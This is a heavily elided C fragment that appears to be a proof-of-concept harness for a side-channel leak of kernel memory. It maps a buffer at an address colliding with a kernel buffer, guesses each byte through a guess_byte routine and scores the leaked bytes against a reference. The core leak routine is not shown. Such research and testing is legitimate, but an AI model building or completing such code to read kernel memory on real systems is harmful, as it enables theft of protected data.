...
static uint64_t guess_byte(size_t offset, size_t guess_offset) {
...
int main(int argc, char** argv) {
    ...
    colliding_buffer = map_buffer(info.kernel_buffer & 0x7ffffffff000ull, 1 << 16) + (info.kernel_buffer & 0xff);
    ...
    for(size_t offset = 0; offset < BUFFER_SIZE; offset ++){
        for(uintptr_t guess = 1; guess < 256; guess ++) {
           if(guess_byte(offset, guess)){
    ...
    for(int i = 0; i < BUFFER_SIZE; i++) {
        correct += leakage[i] == (uint8_t)rand64();
    }
    printf("correct: %u\n", correct);
